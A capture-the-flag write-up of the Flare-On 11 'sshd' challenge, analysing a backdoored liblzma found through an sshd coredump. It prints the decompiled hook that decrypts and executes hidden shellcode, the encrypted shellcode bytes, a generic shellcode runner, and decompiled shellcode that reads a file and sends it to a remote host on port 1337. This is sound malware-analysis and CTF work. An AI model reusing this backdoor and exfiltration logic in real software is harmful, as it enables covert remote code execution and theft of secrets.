---
title: "sshd Flareon 11 (Level 5) writeup"
date: 2024-12-21T22:20:12-05:00
draft: false
---

![flareon11_sshd_chal](/images/sshd-flareon11/flareon11_sshd_chal.png)

unzipping the challenge, we see that we have a Linux filesystem. Looking through the filesystem, we can find a coredump at `var/lib/systemd/coredump/sshd.core.93794.0.0.11.1725917676`
# coredump

Loading the coredump using `pwndbg`, we can see that it was from `sshd`
![sshd_coredump](/images/sshd-flareon11/sshd_coredump.png)

we can load `sshd` with the `coredump` using 
`pwndbg usr/sbin/sshd -c var/lib/systemd/coredump/sshd.core.93794.0.0.11.1725917676`

using the `bt` command we can list the backtrace to find where the program crashed. we can see that the program crashed in `lzma_index_stream_flags()` from `/lib/x86_64-linux-gnu/liblzma.so.5`
![pwndbg_bt](/images/sshd-flareon11/pwndbg_bt.png)

Another interesting we can see is that there is a `undefined symbol: RSA_public_decrypt` string in R9 register
![R9_RSA](/images/sshd-flareon11/R9_RSA.png)

opening  `/lib/x86_64-linux-gnu/liblzma.so.5` in ida, we can search for the string `RSA_public_decrypt ` in the binary, we can see that only `sub_9820` uses the string `RSA_public_decrypt `

```c
__int64 __fastcall sub_9820(unsigned int a1, _DWORD *a2, __int64 a3, __int64 a4, unsigned int a5)
{
  const char *v9; // rsi
  void *v10; // rax
  void *v12; // rax
  void (*v13)(void); // [rsp+8h] [rbp-120h]
  unsigned __int64 v14[25]; // [rsp+20h] [rbp-108h] BYREF
  unsigned __int64 v15; // [rsp+E8h] [rbp-40h]

  v15 = __readfsqword(0x28u);
  v9 = "RSA_public_decrypt";
  if ( !getuid() )
  {
    if ( *a2 == 0xC5407A48 )
    {
      sub_93F0((__int64)v14, (const __m128i *)(a2 + 1), (__int64)(a2 + 9), 0LL);
      v12 = mmap(0LL, dword_32360, 7, 34, -1, 0LL);
      v13 = (void (*)(void))memcpy(v12, &unk_23960, dword_32360);
      sub_9520(v14, v13, dword_32360);
      v13();
      sub_93F0((__int64)v14, (const __m128i *)(a2 + 1), (__int64)(a2 + 9), 0LL);
      sub_9520(v14, v13, dword_32360);
    }
    v9 = "RSA_public_decrypt ";
  }
  v10 = dlsym(0LL, v9);
  return ((__int64 (__fastcall *)(_QWORD, _DWORD *, __int64, __int64, _QWORD))v10)(a1, a2, a3, a4, a5);
}
```

# Analyzing sub_9820

Looking at `sub_9820`, we can see that `dlsym` is used to get the address of `RSA_public_decrypt `
after which it is executed. Hence we can conclude that the program crashed at this function.

Next we need to determine if the contents inside the `if` loop was ever executed, to do that we can check if `*a2 == 0xC5407A48`, looking in ida we can see that the corresponding assembly code for this check is 
```c
cmp     dword ptr [rbp+0], 0C5407A48h
jz      short loc_98C0
```

inspecting `rbp` in pwndbg reveals that `[rbp+0]` is equals to `C5407A48`, hence the code in the loop was executed.
![C5407A48](/images/sshd-flareon11/C5407A48.png)

A quick look inside the `if` condition, we can see that there are 2 interesting parts
- calls to `sub_93F0` and `sub_9520` 
- a call to `mmap`, `memcpy` and executing `v13()`
```c
sub_93F0((__int64)v14, (const __m128i *)(a2 + 1), (__int64)(a2 + 9), 0LL);
v12 = mmap(0LL, dword_32360, 7, 34, -1, 0LL);
v13 = (void (*)(void))memcpy(v12, &unk_23960, dword_32360);
sub_9520(v14, v13, dword_32360);
v13();
sub_93F0((__int64)v14, (const __m128i *)(a2 + 1), (__int64)(a2 + 9), 0LL);
sub_9520(v14, v13, dword_32360);
```

## Analyzing `sub_93F0` and `sub_9520` 

Looking at `sub_93F0` first, we can see that there is a string `expand 32-byte k` which after a quick google search shows that it is used by `chacha20` cipher. Hence we can conclude that `sub_93F0` is a `chacha20` encryption function. 

Looking at `sub_9520`, we can deduce that it is the `chacha20` decryption function.

## Analyzing mmap

Next we can analyze 
```c
v12 = mmap(0LL, dword_32360, 7, 34, -1, 0LL);
v13 = (void (*)(void))memcpy(v12, &unk_23960, dword_32360);
sub_9520(v14, v13, dword_32360);
v13();
```

`dword_32360` is `3990`, hence we can see that `mmap` is used to allocate `3990` bytes of memory. 
`memcpy` is used to copy `3990` bytes from `&unk_23960` into the memory allocated by `mmap`, after which the bytes are decrypted using `sub_9520` and executed (`v13()`). 

# finding the first decryption key

we can see that the decryption function is `sub_9520(v14, v13, dword_32360);` where `v13` is the encrypted buffer, `dword_32360` is the encrypted buffer length `3990`, hence `v14` has to be the decryption key.

Looking at the assembly portion of the decryption call function, we can see that the encryption key comes from the register `r15`
```c
mov     r8, [rsp+128h+var_120]
movsxd  rdx, cs:dword_32360     // dword_32360
mov     rdi, r15                // v14
mov     rsi, r8                 // v13
call    sub_9520
```

Looking at the assembly, we can notice that `r15` is set from the first call of `sub_93F0` function
```c
sub_93F0((__int64)v14, (const __m128i *)(a2 + 1), (__int64)(a2 + 9), 0LL);

// assembly
lea     r11, [rbp+24h]
lea     r10, [rbp+4]
xor     ecx, ecx          // 0
lea     r15, [rsp+20h]
mov     rdx, r11          // a2 + 9
mov     rsi, r10          // a2 + 1
mov     [rsp+24], r11
mov     rdi, r15          // v14
mov     [rsp+16], r10
call    sub_93F0
```
Looking at `sub_93F0`, we can tell that `[rbp+24h]` (`a2+9`) and `[rbp+4]` (`a2+1`) is the nonce and key respectively. the key is 32 bytes while the nonce is 12 bytes.
```c
__int64 __fastcall sub_93F0(__int64 a1, const __m128i *a2, __int64 a3, __int64 a4)
{
  __int64 v5; // rdi
  int v7; // ecx
  __int32 v8; // ecx
  int v9; // edx
  __int64 result; // rax

  *(_QWORD *)a1 = 0LL;
  v5 = a1 + 8;
  *(_QWORD *)(v5 + 176) = 0LL;
  memset(
    (void *)(v5 & 0xFFFFFFFFFFFFFFF8LL),
    0,
    8 * ((unsigned __int64)((unsigned int)a1 - (v5 & 0xFFFFFFF8) + 192) >> 3));
  *(__m128i *)(a1 + 72) = _mm_loadu_si128(a2);
  *(__m128i *)(a1 + 88) = _mm_loadu_si128(a2 + 1);
  *(_QWORD *)(a1 + 104) = *(_QWORD *)a3;
  v7 = *(_DWORD *)(a3 + 8);
  qmemcpy((void *)(a1 + 128), "expand 32-byte k", 16);
  *(_DWORD *)(a1 + 112) = v7;
  *(__m128i *)(a1 + 144) = *a2;
  *(_QWORD *)(a1 + 160) = a2[1].m128i_i64[0];
  *(_DWORD *)(a1 + 168) = a2[1].m128i_i32[2];
  v8 = a2[1].m128i_i32[3];
  *(_DWORD *)(a1 + 176) = 0;
  *(_DWORD *)(a1 + 172) = v8;
  *(_DWORD *)(a1 + 180) = *(_DWORD *)a3;
  *(_DWORD *)(a1 + 184) = *(_DWORD *)(a3 + 4);
  *(_DWORD *)(a1 + 188) = *(_DWORD *)(a3 + 8);
  *(_QWORD *)(a1 + 104) = *(_QWORD *)a3;
  v9 = *(_DWORD *)(a3 + 8);
  result = (unsigned int)(*(_DWORD *)(a1 + 104) + HIDWORD(a4));
  *(_DWORD *)(a1 + 176) = a4;
  *(_DWORD *)(a1 + 112) = v9;
  *(_DWORD *)(a1 + 180) = result;
  *(_QWORD *)(a1 + 120) = a4;
  *(_QWORD *)(a1 + 64) = 64LL;
  return result;
}
```

Back in pwndbg, we can examine the memory at `[rbp+24h]` (`a2+9`) and `[rbp+4]` (`a2+1`) to extract the key and nonce.
```c
pwndbg> x/8wx $rbp+4 
0x55b46d51dde4: 0x38f63d94      0xe21318a8      0xa51863de      0xbaa0f907
0x55b46d51ddf4: 0x7b8abb2d      0xd06636a6      0x5ea6118d      0x6fd614c9
```

```c
pwndbg> x/3wx $rbp+0x24
0x55b46d51de04: 0x9f8336f2      0x1a71cd4d      0x55298652
```

key: `943df638a81813e2de6318a507f9a0ba2dbb8a7ba63666d08d11a65ec914d66f`
nonce: `f236839f4dcd711a52862955`

# Decryption

Next we can extract out the encrypted bytes from ida
```
0fb0354e81fd50e504bf6b1bc20f66167f1a8066014b3feda68baa2d42ae3be87ce8703035e632223d8ab9df9769b3426de484665bc7d5295347073ecffb29bfc21f36dd284146a36899ffefe9d0c5e71fda58adbcb3924d923fc580d6dfd8fbc3cc3e45c319c0caf380e54584b3eca78853eb9f7e7cc921f15d526394de65f53b18117e4e030a311e57d0d248368a607ce15ffe774f417fc726d32ec09d266144792aaeadc2d391bfba987abded1ce1125379e9a973839cdfc61101d1a94442bd765932e017fc53dca8eebc9679dc47185d120a1ae56b54e5cdee9b5687d5b1e86d8da957e6e986ab4a7faad933dfd07759f8d7cf4152c798bd51a7c2c8355512d4b3b5abef3e3b73818e30276b80e2d1cdd714fb48d1e894dda30a6a2d0417c7507b5552d63bbe7cead0a4f7c069be5765cc61ba671efc8011390e8143b89af5734617a31add326550afd23e83b5620d4415fa92b7c0cc70aff6c2e3330eff8c901cd16ec0819ae7e50efa86b5535accb38109df76d1832fcfd80dffd73b43c2c1b7c7df05766c887d28ec0feff48b12cdfc08dbbd82007cf3958e41cdfdfdee0f6ea39986973bb3234135f66690a25aeabbfcb0f44dd54814712498c2331186f0f7a1f8140c1cead4ab40f5b79a000a4072466b23b30b145df0a35e2b0e55f6bbdc1ce99fa674c51c291d59049651c2968bd431d52ce095bf4bdce8524fb077bffdbf7cbae320d27517fef034e43ebbd756e625e80ba71c5bf2eb244570629d74bd8ee5c4fd730ca1a104b0e43f41c2d9ba73d2d16a8c37bc2bee37ece01fa3f03a40bde70ccd34e7f0b797cc5b524f80ed4f1e5b047e62d7a0a3003d5dcd850d035ac00e634419fdc22b483fe81d4ef614ffac75a2f4185532503bd4df08c27f5b9cd2d8bbc42311fe9d049948af36f1aff565ed30b6e61113659bf6978601e773a6b0dbf949f31c947e98fe52bc6b6d87592d1b6effaf2d5d5c6daa71848a91beb205b4369f981bac6cc043736ab06b5ecb903495c283039b4792e8f5e0b6deeac0645489c90bfa02176b92153643141846c7242caa43a45f04e08d6e653f3318f31463f6d7becfdb37624e2609fd627a90dd6111e6abcdeee373036b143b130b576487428a686426b80d1f6032089955cfaf17fd358706ca2241428d646de3b739455ea2de7b9b9c52f54681217deb59620ad1a662da5e9f8a082346b0ef91b8dce971d553258845a52d3f683a07d16816f2a6c120dc9411e437b7d924752bb4e675594a83fe0bd7164d669a04462ba96cc63d69db7d241a48e11fdf630529f60f97a0e494e6fe520e3878aeb81f6b804f28f5daa99ece0049d0132200cb6c6e454d253e5a999ab02de9b724eb905baaf523269a3acd5cd0fe6fcbef31d6f261a962fe0a461c87899cd3a0bbae2eb2c79bc0b29d17aad5ac93d6c8c826db14a8f20c19e030d0d5478037c52aa92b0595931496d505e7db8f7107214c888f0e1bcc63219c4982d7b81febbc6f3c0a2822d708d7b078b1bb202fea182d86b6e6e2f8c20c0f94e18de818951f540a2358cea4cc237f5e5ca94ef871a794a8556a689c5956f964bd55a65a5003c3bd18e71a3a1b289867a7c502991cbd6e8c398eaa97c0a59bedca29b70d318bfa20f3935e4cbb0e2c4067b4e2dfa0c465de7dee91eaa5a3ca6331d3f2d8207bf0614efa76a6c212219e56a1d5415b838a1cfefb93f2e22539b62f16c977179c162da22713cf1a8274518b168f796449baf5dbdccc281c23e6cb3c5c48071b9637652ca29ac22fc6e81a563153cfec1b6cfcebbc5019974e1416cb97f4acd8827df34702f4da695e52fb30bc8e302c10f52fd1ec0d133b78cc7eb59c434c3627f90cdbc6b84725d1ed85a41cdb1b3e1a8e85bc113c6c396b347f9abaa57b97c11683d3dcb6e1ce9ce83dd56392bacfe895a36c239860963a7a3b61a0602ba4268bb67a886863690a2847fbb85821833598b347447abb78212d3bd7f60345d38fe4d1a2f429aa2b08d8b4cd364b3e41bdfef3b67b1815a080b12703132691dc0a1cdc8fb80c8696cd86f9a8d819697bd1ce8d5951dc7daaafa42016173e00a2d5cdf74d423a1974b49a9f8dbc0601c3b566a73bbd10856801de718a71105013fedf7e23da3c0b2f7cf2e0f471f3d601d0a66dbefa0ada08e96386ee0cb7e5eac965204b53009db3ad0a93835f24118d0df48bdfa5618d08702e175990a189e463b4d2b51285ca48c72d0b1bd286cc604c33facc174aea16e808732ab528b5028096c32ead62877c767faa57817e170274c0980cd063eee529a85f2e374bae6ebee7cf26733eedec18a533b8a4646127f84be1666888b2e9872440cb0eafa244c81008d41e2bde095c94db4630c03c6c0e8a6fb915cee84baa2dce72f6b7d2f4a94bb14e63dd204b1fed12a1df7425a9b01bd7739eb830cb8a998dde210db89f2703e21fdeb91e1ff630a71099605aaeb75205f07f1c7e90474638a6c3411e9556a34e672440a4bf05c182a804fcae1eca75a3c53d4aff3ffeed7165e5b8c57f44865670cfa7b12a6a63ed4854530d6cf2a211b11e85d36743235780c9b6501026a791356f4814d3408f53e73256433e66409939121c3fde5ca6199112ecc6198911f69b66eb99fdddcd562cbc4cd0dac4a305780a948bcf35ef8a2f5351466175f55bcf91ffc605762b1dc1aa17e0ec2deb47920a94589adef63575da48fe2e98680dc63976f3dc0bc91288c9a417184f68d71fbe8cff4d9e67b9e0450e726bb179338e6c3ec51f268d7694bbd03b0b68fb33ddcb4c059b52fba6764520df07ccd3f7178c84c0c6f7d12fa46438b243cbc78d8de96044438b42d7360062b4a9961f9c31d492e0cee84764d0553e98057d3d95c49b05e604a03f285aeaef16bb7661446c5b2e2d5637adafc0310a44abc9e67b8f836f780026c98858ba8da0ed899e01a5da26b2d8bf9ccee984d916803c95ad604dcdf116304b7e827ca7c7f9b7b3a835d658bea901525ddf12d1b4939cf9f11795d0f9e76190c4d4d266988e365ead38fe51fb074844c8fb6dbddfee225092aa2b8623fabac39cddb6e2062f0385e1f2d838e7292c1671f0aee7f3db5cdf9c8e385cd5ab03a580810ace75355c3a3373f3268a1da807cbb3801ac2c54948d8ca7ac1c5f25210ad4708498df115a11d6e8a9931c479464f785f87b79bd4b3a0201a2de0594d96fc7a4ae03afb857a631f00b722b107e754c38bdb1ebd7a1d01e194cbceb24ddec89cd6448fa930e7be5c6f59a13a0f9c9352bf3f03df6f0ae0f868a56aa26e0f3569f8fd376e816ada77803cdee0c7b9aed820b3a5a2847aff1fbe4b435281c2d11202a5b849442ca588c607f5ea1dbbb66852e84ad3d9f60a97dfa4d1060bcda6305b2b8744445d69d3acb8966f28087d2e3d72b8396dcbb1c8a753b9989a9ca97c9db74ba74968a9ad604e23a65f20b15d772f02101a90633b481f2acc6b1cca8b54ee5b4d5dfa9a8aec996d88e5f1c94ab8d521780bb1b90f0a2290f7e25e976f45d6eb4e3aff89235893ba9837fc783d88f4f3bed8467df5d633c590fd8080a3a2dbe9b0a3dfe56f154d300ea817b202845eac06f2c6d7a2c0ce9fbb504c4a4b1583b269c48cd993b4d0762cb836a1a1bfbf614e8f3a9c7139e336cf4c7ee07604b76646e8bd57b67c79c5c4a9d53b27d2c74d84e1acdc942b1a02b56dfe15bde63161493b79d616a1e5aa339e3dae4f1e627390e8694b265bfd8fdaa83db379b8f395b6f37b3f98d4d9dbfb23024bd45edc564ec7968961e1ebc5cde461e19191e39e52bc7dc07ec9afba567d849b0f4b91c10604a847fa079ddffa93a9684d3bc0cb48cd5bfdbd21b5e51773623aff20b4bc802b2413738ac0a6c44f85a5844614e9ca292f5c6b2a5818d12a066aa2f97e446c28c46a0510a4e1849db08263b2d8f1cd4cce23a60bb5d590b6813de8d503e19057c72dd6683b1ccfc12112830d50bb47ae054125b9f5e98b3ba7e2e74435d2b0bbae15462c261acc87bafd688ce3c80c80d7b3e8d8f92f5c8d7129da8ead6038b6be73ebb7aba263eb5e17545551a745025b67e365c9d6918b9b8189b940d8c33dc9f5922403a39dd2466346094cb824e0c4a2f4e551abc8c12fb2270d61b0f92d0eac9e7436f9c505ee90c49361d95ed8a4e52360d05679cc2712996b19e488c18ccc617cbea98c6b6b8a7a395eb1c071c6f749e45c41ab64d10c7e8ac05c0b51a1757ab60780bace893ff709825c290f332044528f0d180496248ef44a1fccf164dc50df1304af12b4371eaaeb9c1401bd553e99f92557ee2ac20f3877dd726e3f99379b69e57a53b05d2653aa764c26d1f2f5feec74f7ebc0b36e492da0f1f0db6be48c3adbd2ceab54a3305a521d2eef1409dec3675e7b550639ac90a6ef532164f2f54ee1a1388fb6323a0fc7eb05383e9eabec54b4268d4c501a6d8136fb696eba3ab01a80507904e1d2fdc7304de70c17c228923d62f8ee4c7331c52d560ecba5e57ed75c884c881bf3a6af941968249fcb1bcbfecebd9950d5dea6ba5fd900f0f33de57f000a10061118732ef2e09d27630579395119afd494d0a5e9705f7fcd9e3303e39751d3a3db4c2c9b41ecf87c68b635cbf44c68cdd60149d962fa606e4f8ea88650ddafaa0e02d472a0e7618bd23227ab3f19e5204a29b3242a5cc95e4429b9f915e0a1d67163675e270519a4b9861447b4f8032a466e8874a27de994fe609c83bd64c64c19d2972cb5d8c436c53746e5ab472656aeaf93f3c08abff1d53bef412de604007445e1fbd38a9a7fb1e1b590b4b45e892c337b4ca7b35c48424468478ac8fd7ad941b170f6d53749cc555845bda354faf2ed471c47e639d99df85260513344d6270e1174d4470465064c2f0e93ddafac20ac20df94506746b12a4e2d5a94b64d534c2de815ec0fb295139cf2aa07c8512f32646e9e3ee766586dd553f0b6f9ff6c998b41dc1146d6c9c4c7aa46717530656445d1996b69d653add37643280657154789cdd5c64a8a1f2f92474b5229c3f8908ea50af69ecec580a40f76601dbee6e89375369c206862b52ab9a022983b620b58b6e13ddfd6ea55aca29a196fe07761c7d45229b3699555e9204a0e97e4ccc043a87244cb34d20406e44832d989bb121f96e949df1fd8819da6003e39885ace466d1061f4930019000c15ad69e9183800cd641d61008bdac417fe60b4d7417e4974c394c10b8e842460d4f01c253baab59e8c57c7fb09f3187ed6d253c690888f031a5bfdddc4318b42a948c3aca95f17c8ebd9507e17890bebacdabeec1b2d9525fc5914d3d4a7b1db27b1737bde7012069c82c4408ab340c99cd2f84a0a3ec4ee95a0c7470b1b7fbd62a33b9d38ccf718d0263cb34c1ed8ba5b72bf72227dfc97046e57db2cf804c3a137df9b78f7606a5169b7b68aaf438eb30dfd21716eea96a54b6d5d7dde8b6b4b9f8500473713c3607ba97311b95d521a60c45ff68f0dbc0019c3ca8a0e1c824cbc0733b2b9b67ce48a03b23e3d03b2d60a24d171fe13af26a44a7be4ec4a9d7ecb9ac8781133a013725faa6511001f50eb8d79aa4e052b669c086973ef426d66af0c4d3686a0d12e5c055a48fefef79100
```

and using Cyberchef we can, we can decrypt it
![cyberchef_chacha20_decrypt](/images/sshd-flareon11/cyberchef_chacha20_decrypt.png)

Disassembling the decrypted bytes using cyberchef, we can see that we get some well-formed assembly. Hence the encrypted bytes being passed into the `mmap` region is shellcode.
![cyberchef_dissasemble](/images/sshd-flareon11/cyberchef_dissasemble.png)

doing a quick google search, we can find sample code that allows us to perform the same operations as the function. https://gist.github.com/StefanoBelli/e295661e300e46676fba3c8172f8a22e 
```c
#include <stdio.h>
#include <string.h>
#include <sys/mman.h>

unsigned char bytes[] = \
	""; // insert decrypted bytes here

int main() {
	void* region = mmap(NULL, sizeof(bytes),
					    PROT_WRITE | PROT_EXEC,	
					    MAP_ANONYMOUS | MAP_PRIVATE,
					    -1,	0);

	if(region == MAP_FAILED) {
		perror("mmap");
		return 1;
	}

	memcpy(region, bytes, sizeof(bytes));

	printf("executing %ld bytes shellcode using mmap system call\n",sizeof(bytes));
	((int(*)())region)();

	//unreachable code
	munmap(region, sizeof(bytes));
	return 0;
}
```

After adding the decrypted bytes to the code above, we can compile it using `gcc` and load the compiled file into ida.

Upon loading the file into ida, we find our decrypted bytes in the `bytes` array
![flareon11_decryptedbytes_in_ida](/images/sshd-flareon11/flareon11_decryptedbytes_in_ida.png)

Since we know that our decrypted bytes is a shellcode, we can convert it to code in ida using `c`
![flareon_convertedtocode](/images/sshd-flareon11/flareon_convertedtocode.png)

# shellcode
Looking through the functions from the decrypted bytes, we can see that there's a function `sub_4E02` which performs the main logic of the shellcode
```c
__int64 __fastcall sub_4E02(__int64 a1, __int64 a2, __int64 a3)
{
  unsigned int v3; // ebx
  signed __int64 v4; // rax
  signed __int64 v5; // rax
  signed __int64 v6; // rax
  signed __int64 v7; // rax
  signed __int64 v8; // rax
  signed __int64 v9; // rax
  unsigned __int64 v10; // kr08_8
  signed __int64 v11; // rax
  signed __int64 v12; // rax
  char ubuf[32]; // [rsp+410h] [rbp-1278h] BYREF
  char v15[16]; // [rsp+430h] [rbp-1258h] BYREF
  char filename[256]; // [rsp+440h] [rbp-1248h] BYREF
  char buf[4224]; // [rsp+540h] [rbp-1148h] BYREF
  unsigned int size; // [rsp+15C0h] [rbp-C8h] BYREF
  unsigned int size_4; // [rsp+15C4h] [rbp-C4h] BYREF

  LOWORD(a3) = 1337;
  v3 = sub_405A(a1, a2, a3);                         // [0]
  v4 = sys_recvfrom(v3, ubuf, 0x20uLL, 0, 0LL, 0LL); // [1]
  v5 = sys_recvfrom(v3, v15, 0xCuLL, 0, 0LL, 0LL);   // [2]
  v6 = sys_recvfrom(v3, &size, 4uLL, 0, 0LL, 0LL);   // [3]
  v7 = sys_recvfrom(v3, filename, size, 0, 0LL, 0LL);// [4]
  filename[(int)v7] = 0;
  v8 = sys_open(filename, 0, 0);                     // [5]
  v9 = sys_read(v8, buf, 0x80uLL);                   // [6]
  v10 = strlen(buf) + 1;
  size_4 = v10 - 1;
  sub_4D12(&buf[v10], buf, ubuf, v15, 0LL);          // [7]
  sub_4D89(&buf[v10], buf, buf, size_4);             // [8]
  v11 = sys_sendto(v3, &size_4, 4uLL, 0, 0LL, 0);    // [9]
  v12 = sys_sendto(v3, buf, size_4, 0, 0LL, 0);      // [10]
  sub_404B();                                        // [11]
  sub_40CF(v3, buf, 0LL);                            // [12]
  return 0LL;
}
```

- `[0]`: opens a socket and makes a connection to `10.0.2.15` on port `1337`
- `[1]`: receives 32 bytes of data
- `[2]`: receives 12 bytes of data
- `[3]`: receives 4 bytes of data
- `[4]`: receives x bytes of data based on `[3]`
- `[5]`: opens the file with the filename from `[4]`
- `[6]`: reads 128 bytes from `[5]`
- `[7]`: calls `sub_4D12`
- `[8]`: calls `sub_4D89`
- `[9]`: sends 4 bytes of data (size of `buf`)
- `[10]`: sends `buf`
- `[11]`: calls `sys_close`
- `[12]`: calls `shutdown`

Analyzing `sub_4D12`, we can see that it also has a reference to `expand 32-byte K`, hence we can conclude that this is a `chacha20` encryption function. since `sub_4D12` is a `chacha20` encryption function that takes in `ubuf` and `v15` from `[1]` and `[2]`, we can conclude that `ubuf` and `v15` is the key and nonce respectively.
				`lea     rax, aExpand32ByteK ; "expand 32-byte K"` 

Next analyzing `sub_4D89` shows that it also its some kind of encryption function. 

In summary, we can conclude that the shellcode opens a network connection, receives data from the attacker, encrypts a file and sends it back to the attacker.

# finding the second decryption key

running `strings` on the coredump, we can see that there are many interesting strings, one of which is `/root/certificate_authority_signing_key.txt` which is not a default file.

using `search` we can search for the string, its at `0x7ffcc6600c18` 
```c
pwndbg> search -t string "/root/certificate_authority_signing_key.txt"
Searching for value: b'/root/certificate_authority_signing_key.txt\x00'
[stack]         0x7ffcc6600c18 '/root/certificate_authority_signing_key.txt'
```
Looking back at ida, we can see the offsets for each variable 
```c
ubuf= byte ptr -1278h         // key
var_1258= byte ptr -1258h     // nonce
filename= byte ptr -1248h     // filename
buf= byte ptr -1148h          // file content buffer
size= qword ptr -0C8h
var_C0= byte ptr -0C0h
```

we can see that the key is `0x30` bytes from the filename 
```c
pwndbg> x/8wx 0x7ffcc6600c18-0x30 
0x7ffcc6600be8: 0x1291ec8d      0xda0e76eb      0xa4877d7c      0x351c2743
0x7ffcc6600bf8: 0x87cbe0d9      0xd9b49389      0x34f9ae04      0xd76621fa
```

the nonce is `0x10` bytes from the filename 
```c
pwndbg> x/8wx 0x7ffcc6600c18-0x10
0x7ffcc6600c08: 0x11111111      0x11111111      0x11111111      0x00000020
0x7ffcc6600c18: 0x6f6f722f      0x65632f74      0x66697472      0x74616369
```

the file buffer is `0x100` bytes from the filename 
```c
pwndbg> x/10wx 0x7ffcc6600c18+0x100
0x7ffcc6600d18: 0x0834f6a9      0x1c9e2a42      0x08a8030c      0x8dbb7094
0x7ffcc6600d28: 0x7b6ddcaa      0x247fff24      0x9e83da7c      0x1d07f792
0x7ffcc6600d38: 0x2e906302      0x000058c1
```

```c
key: 8dec9112eb760eda7c7d87a443271c35d9e0cb878993b4d904aef934fa2166d7
nonce: 111111111111111111111111
filename: /root/certificate_authority_signing_key.txt
encrypted bytes: a9f63408422a9e1c0c03a8089470bb8daadc6d7b24ff7f247cda839e92f7071d0263902ec1580000
```

After getting the require information, we can write a script to send the data back to the program. we can see that it successfully decrypts the encrypted bytes and gives us the flag!
```python
└─$ python c2.py
Connected by ('10.0.2.15', 36670)
sent: b"\x8d\xec\x91\x12\xebv\x0e\xda|}\x87\xa4C'\x1c5\xd9\xe0\xcb\x87\x89\x93\xb4\xd9\x04\xae\xf94\xfa!f\xd7"
sent: b'\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11'
sent: b'\n\x00\x00\x00'
sent: b'1234567890' # filename containing the encrypted bytes
data: b'&\x00\x00\x00'
data: b'supp1y_cha1n_sund4y@flare-on.com\n\x86Xm\xb4U'
```
